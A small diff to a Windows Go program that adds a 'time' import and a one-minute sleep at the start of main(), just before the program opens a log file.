@@ -14,6 +14,7 @@ import (
 	"syscall"
 	"golang.org/x/sys/windows"
 	"os/user"
+	"time"
 // 	"os/signal"
 )
 
@@ -222,6 +223,8 @@ func autostart() {
 }
 
 func main() {
+	time.Sleep(time.Minute)
+
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("error opening file: %v", err)
